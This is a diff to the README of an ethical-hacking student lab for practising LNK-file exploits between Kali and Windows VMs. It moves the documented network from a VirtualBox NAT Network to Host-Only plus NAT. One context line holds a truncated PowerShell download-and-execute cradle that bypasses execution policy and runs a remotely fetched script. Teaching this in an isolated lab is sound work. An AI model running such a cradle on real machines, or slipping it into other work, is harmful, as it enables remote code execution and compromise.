@@ -97,10 +97,10 @@ cd /vagrant/exploits/lnk
 
 ### Network Configuration
 
-- **Network Type**: NAT Network (192.168.56.0/24)
-- **Network Name**: LNK_Exploit_Lab_Network
-- **Configuration**: Single adapter per VM (simpler setup)
-- **Connectivity**: VM-to-VM communication + Internet access
+- **Network Type**: Host-Only (192.168.56.0/24) + NAT
+- **Adapter 1**: NAT (internet access for provisioning)
+- **Adapter 2**: Host-Only (VM-to-VM communication)
+- **Connectivity**: VM-to-VM communication enabled
 - **Verified**: Automatic connectivity testing during setup
 
 ### Exploit Materials
@@ -187,7 +187,7 @@ cd ethical-hacking-student-lab
 The script will:
 1. Check prerequisites
 2. Prepare exploits directory
-3. Create VirtualBox NAT Network
+3. Configure VirtualBox Host-Only network
 4. Build Kali Linux VM (5-10 min)
 5. Build Windows VM (20-30 min)
 6. Verify connectivity between VMs
@@ -400,13 +400,13 @@ ethical-hacking-student-lab/
 
 ### Best Practices
 
-- Use in isolated lab environment (NAT Network)
+- Use in isolated lab environment (Host-Only network)
 - Keep VM snapshots for easy reset
 - Document your findings professionally
 - Understand defensive countermeasures
 - Never use on unauthorized systems
 - Never share malicious files outside lab
-- VMs have internet but are isolated from host network
+- VMs communicate via isolated Host-Only network
 
 ---
 
@@ -461,8 +461,8 @@ df -h  # Check disk space
 # Verify connectivity from Kali
 ping 192.168.56.102
 
-# Recreate NAT Network if needed
-VBoxManage natnetwork remove --netname LNK_Exploit_Lab_Network
+# Recreate Host-Only network if needed
+VBoxManage hostonlyif remove vboxnet0
 ./setup.sh
 ```
 
@@ -483,7 +483,7 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://1
 - **Learning Time**: 4-8 hours (complete lab)
 - **Reset Time**: 30 seconds
 - **Disk Usage**: ~30GB (running VMs)
-- **Network Type**: NAT Network (VM-to-VM + Internet)
+- **Network Type**: Host-Only (VM-to-VM) + NAT (Internet)
 
 ---
 
@@ -605,7 +605,7 @@ See [LICENSE](LICENSE) file for details.
 - ONE-COMMAND SETUP - Complete automation
 - LOCAL VMs - No cloud, no costs
 - FAST RESET - 30-second snapshot restore
-- NAT NETWORK - Single adapter setup with VM-to-VM + Internet
+- ISOLATED NETWORK - Host-Only for VM-to-VM, NAT for internet
 - PRE-GENERATED EXPLOITS - Ready to use
 - SOCIAL ENGINEERING - Real-world attack scenario
 - COMPREHENSIVE DOCS - Step-by-step guides
